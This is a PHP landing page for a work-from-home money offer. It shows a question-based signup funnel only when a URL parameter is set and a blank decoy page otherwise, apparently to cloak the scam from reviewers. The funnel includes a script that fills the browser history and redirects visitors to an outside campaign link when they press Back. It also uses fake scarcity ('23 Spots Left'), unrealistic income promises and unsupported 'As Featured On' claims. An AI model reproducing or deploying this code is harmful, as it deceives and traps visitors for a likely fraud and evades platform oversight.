<?php 
if ( isset($_GET['va']) && !empty($_GET['va']) ){ ?>
  <html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="icon" type="image/x-icon" href="/favicon.ico">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link rel="stylesheet" href="css/style.css" type="text/css" media="all">
    <link rel="stylesheet" href="css/media.css" type="text/css" media="all">
    <title>23 Spots Left</title>
    <script type="text/javascript">
      !function(){
        var campaign_link = "https://btthunder.com/path/lp.php?trvid=10016&trvx=9291c10d"; 
        var t;             
        try{
          for(t=0;10>t;++t)history.pushState({},"","#");
          onpopstate=function(t){t.state&&location.replace(campaign_link)}}
        catch(o){}
      }();
    </script>
</head>
<body>
    <header>
        <div class="container customContainer">
            <div class="row">
                <div class="col-12">
                    <div class="text-center XmediumText headerWarn"><span>Exclusive Offer:</span> Only <span >23 Spots</span> Left</div>
                    <h1 class="largeText text-center">Start Earning an Income From Home!</h1>
                    <div class="heading2 text-center XlargeText w700">100% Done For You System</div>
                    <ul class="topList d-flex justify-content-around align-items-center">
                        <li class="MregularText w700 d-flex align-items-center"><img alt="image" src="img/tik-img.png">BeYour Own Boss</li>
                        <li class="MregularText w700 d-flex align-items-center"><img alt="image" src="img/tik-img.png">Make Big Profits</li>
                        <li class="MregularText w700 d-flex align-items-center"><img alt="image" src="img/tik-img.png">Work From Anywhere</li>
                    </ul>
                </div>

            </div>
        </div>
    </header>
    <div class="questionsBlock customContainer">
        <div class="container  ">
            <div class="row">
                <div class="col-12 questHead ">
                    <h2 class="text-center XXmediumText">Just answer 3 simple questions to qualify! </h2>
                </div>
                <div class="col-12  ">
                    <div class="progress">
                      <div class="progress-bar" role="progressbar" aria-valuenow="33" aria-valuemin="0" aria-valuemax="100"></div>
                    </div>

                </div>
                <div class="col-12 step">
                    <h3 class="d-flex largeText"><span>Q1.</span> How much are you looking to make per month?</h3>
                    <ul  class="opt-list">
                        <li>
                            <input type="radio" id="r1" name="rr" checked="checked" />
                            <label for="r1"><span></span>$2,500</label>
                        </li>
                        <li>
                            <input type="radio" id="r2" name="rr" />
                            <label for="r2"><span></span>$5,000</label>
                        </li>
                        <li>
                            <input type="radio" id="r3" name="rr" />
                            <label for="r3"><span></span>$10,000</label>
                        </li>
                        <li>
                            <input type="radio" id="r4" name="rr" />
                            <label for="r4"><span></span>$25,000</label>
                        </li>
                    </ul>
                    <a href="#" class="nextBtn"><img alt="image" src="img/btn.png"></a>
                </div>
                <div  style="display: none;" class="col-12 step">
                     <h3 class="d-flex largeText"><span>Q2.</span>How many hours a week do you want to work?</h3>
                    <ul  class="opt-list">
                        <li>
                            <input type="radio" id="rr2r1" name="rr2" checked="checked" />
                            <label for="rr2r1"><span></span>2 Hours</label>
                        </li>
                        <li>
                            <input type="radio" id="rr2r2" name="rr2" />
                            <label for="rr2r2"><span></span>5 Hours</label>
                        </li>
                        <li>
                            <input type="radio" id="rr2r3" name="rr2" />
                            <label for="rr2r3"><span></span>10 Hours</label>
                        </li>
                        <li>
                            <input type="radio" id="rr2r4" name="rr2" />
                            <label for="rr2r4"><span></span>15+ Hours</label>
                        </li>
                    </ul>
                    <a href="#" class="nextBtn"><img alt="image" src="img/btn.png"></a>
                </div>
                <div style="display: none;" class="col-12 step">
                     <h3 class="d-flex largeText"><span>Q3.</span>Why are you looking to work from home?</h3>
                    <ul  class="opt-list">
                        <ul  class="opt-list">
                            <li>
                                <input type="radio" id="rr3r1" name="rr3" checked="checked" />
                                <label for="rr3r1"><span></span>Tired of my job</label>
                            </li>
                            <li>
                                <input type="radio" id="rr3r2" name="rr3" />
                                <label for="rr3r2"><span></span>Need more time with family</label>
                            </li>
                            <li>
                                <input type="radio" id="rr3r3" name="rr3" />
                                <label for="rr3r3"><span></span>Need more time for vacation</label>
                            </li>
                            <li>
                                <input type="radio" id="rr3r4" name="rr3" />
                                <label for="rr3r4"><span></span>It just makes sense</label>
                            </li>
                        </ul>
                    </ul>
                    <a href="#" class="nextBtn lastBtn"><img alt="image" src="img/btn.png"></a>

                </div>
            </div>
            
        </div>
    </div>
    <div class="container customContainer logosBlock">
        <div class="row">
            <div class="col-12 text-center">
                <h4 class="w700 mediumText">As Featured On</h4>
                <img alt="logos" src="img/featured-logo.png">
            </div>
        </div>
    </div>
    <footer >
        <div class="container customContainer">
            <div class="row">
                <div class="col-12 d-flex align-items-center justify-content-between">
                    <p class="footer-inc">© 2020</p>
                    <ul class="d-flex">
                     <li><a href="/privacy-policy.html">Privacy Policy</a></li>
                      <li><a href="/terms.html">Terms and Conditions</a></li>
                    </ul>
                </div>
            </div>
        </div>

    </footer>
    <div   class="loaderContainer">
        <img alt="loader" class="loadImg" src="img/InitLoading.gif">
    </div>
        

    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" ></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
    <script type="text/javascript" src="js/custom.js"></script>

</body>
</html>
<?php } else { ?>
  <html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="icon" type="image/x-icon" href="/favicon.ico">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link rel="stylesheet" href="css/style.css" type="text/css" media="all">
    <link rel="stylesheet" href="css/media.css" type="text/css" media="all">
    <title>23 Spots Left</title>
</head>
<body>
    <div class="container logoContainer">
      <div class="row">
        <div class="col-md-8 offset-md-2 d-flex align-items-center justify-content-between ">
          <img src="/logosp.png" class="pageLogo" alt="logo">
        </div>
      </div>
    </div>
    <div class="wrapper altWrap">
      

    </div>
         <footer >
        <div class="container">
            <div class="row">
                <div class="col-md-8 offset-md-2 d-flex align-items-center justify-content-between">
                    <p class="footer-inc">© 2020</p>
                    <ul class="d-flex">
                     <li><a href="/privacy-policy.html">Privacy Policy</a></li>
                      <li><a href="/terms.html">Terms and Conditions</a></li>
                    </ul>
                </div>
            </div>
        </div>

    </footer>
</body></html>
<?php }
 ?>